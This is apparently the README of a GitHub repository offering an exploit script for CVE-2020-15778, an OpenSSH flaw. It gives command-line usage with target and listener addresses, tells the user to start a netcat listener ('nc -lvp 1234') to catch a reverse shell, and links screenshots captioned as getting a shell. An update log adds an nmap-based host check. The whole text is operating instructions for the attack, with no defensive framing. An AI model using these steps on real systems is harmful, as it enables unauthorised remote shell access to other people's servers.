# CVE-2020-15778-Exploit
## Exploit for CVE-2020-15778(OpenSSH vul)  
Example: python CVE-2020-15778.py -ip 192.168.11.123 -lhost 192.168.11.124 -lport 1234  
You need to use netcat to listen port before use python script  
Example: nc -lvp 1234  
1.Screenshot of using script  
![Alt text](https://github.com/yukiNeko114514/CVE-2020-15778-Exploit/blob/main/img/1.PNG)  
2.Screenshot of get shell  
![Alt text](https://github.com/yukiNeko114514/CVE-2020-15778-Exploit/blob/main/img/2.PNG)  
  
 2021-7-21 Update Log:  
 Use python-nmap to check host status  
 Usage:python3 CVE-2020-15778-Update.py -ip 192.168.11.123 -lhost 192.168.11.124 -lport 1234  
 "pip3 install python-nmap" before you use Update version script  
 XD
